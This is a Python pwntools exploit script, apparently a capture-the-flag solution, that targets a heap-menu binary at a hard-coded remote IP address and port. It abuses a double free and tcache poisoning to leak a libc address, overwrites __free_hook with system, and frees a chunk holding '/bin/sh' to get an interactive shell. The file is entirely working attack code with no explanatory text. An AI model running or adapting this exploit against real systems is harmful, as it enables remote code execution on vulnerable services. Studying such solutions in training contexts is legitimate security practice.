from pwn import *

elf = context.binary = ELF('./chall')
libc = ELF('./libc.so.6')

host = args.HOST or '13.233.104.112'
port = int(args.PORT or 1111)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b addChunk
b deleteChunk
b viewChunk
continue
'''.format(**locals())

# -- Exploit goes here --
p = start()

def add(size, data):
	p.recvuntil('Choice >> ')
	p.sendline('1')
	p.recvuntil('Enter size >> ')
	p.sendline(str(size))
	p.recvuntil('Enter data >> ')
	p.sendline(data)

def leaks(idx):
	p.recvuntil('Choice >> ')
	p.sendline('2')
	p.recvuntil('Enter index >>')
	p.sendline(str(idx))
	p.recvuntil('You data:\n')
	target = p.recvline().strip()
	return target


def delete(idx):
	p.recvuntil('Choice >> ')
	p.sendline('3')
	p.recvuntil('Enter index >> ')
	p.sendline(str(idx))

add(0x98, 'A')
add(0x30, 'A')
delete(1)
delete(1)

# Tcache to unsorted bin
for i in range(8):
	delete(0)
	#print(i+1)

# Leak libc
leak = u64(leaks(0).ljust(8, '\x00'))
log.info('Leak: {}'.format(hex(leak)))
libc_base = leak - 0x3ebca0
log.info('Libc base: {}'.format(hex(libc_base)))

# free_hook
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

# fw = free_hook address
add(0x30, p64(free_hook))

add(0x30, '/bin/sh\x00')

# system address store in free_hook
add(0x30, p64(system))
delete(3)

p.interactive()
p.close()